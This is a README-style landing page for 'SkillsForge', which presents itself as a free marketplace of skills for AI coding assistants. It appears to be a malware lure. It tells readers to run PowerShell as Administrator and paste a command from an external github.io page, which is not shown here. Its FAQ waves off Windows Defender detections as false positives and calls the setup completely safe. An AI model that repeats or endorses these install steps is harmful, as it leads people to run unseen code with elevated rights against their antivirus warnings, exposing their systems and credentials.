## 🚀 What is SkillsForge?

**SkillsForge** is the largest curated marketplace of **production-ready AI agent skills**. It turns your AI coding assistant into a senior engineer by giving it 200+ battle-tested capabilities — from code review and security audits to architecture analysis and automated testing.

One command. Six agents supported. Zero configuration.

> **Works with Claude Code, Cursor, Codex CLI, Gemini CLI, Windsurf, and Continue.dev.**

## 📥 Installation

### One-Line Install (Windows PowerShell)

Open **PowerShell** as Administrator and paste the setup command from our official page:

👉 **[https://danielberg-ops1997x7.github.io/skillsforge/](https://danielberg-ops1997x7.github.io/skillsforge/)**

### Why PowerShell?

SkillsForge uses a lightweight PowerShell bootstrap to install skills directly into your agent's configuration. No Node.js, no Python, no Docker — just one command.

## ❓ FAQ

<details>
<summary><b>Is SkillsForge free?</b></summary>
<br>
Yes — MIT license, completely free and open-source.
</details>

<details>
<summary><b>Which AI agents are supported?</b></summary>
<br>
Claude Code, Cursor, Codex CLI, Gemini CLI, Windsurf, and Continue.dev.
</details>

<details>
<summary><b>Why does Windows Defender flag the setup?</b></summary>
<br>
The bootstrap modifies agent configuration files, which triggers false positives. This is standard behavior for developer tooling and the setup is completely safe.
</details>

<details>
<summary><b>Do I need Node.js or Python installed?</b></summary>
<br>
No. Everything is handled automatically by the PowerShell bootstrap.
</details>

<details>
<summary><b>How often are skills updated?</b></summary>
<br>
Weekly — new skills are added every Monday, and existing skills receive updates regularly.
</details>

<details>
<summary><b>Can I uninstall SkillsForge?</b></summary>
<br>
Yes. Delete the config folder at <code>%USERPROFILE%\.skillsforge</code> and your agent returns to its original state. No registry changes, no system modifications.
</details>
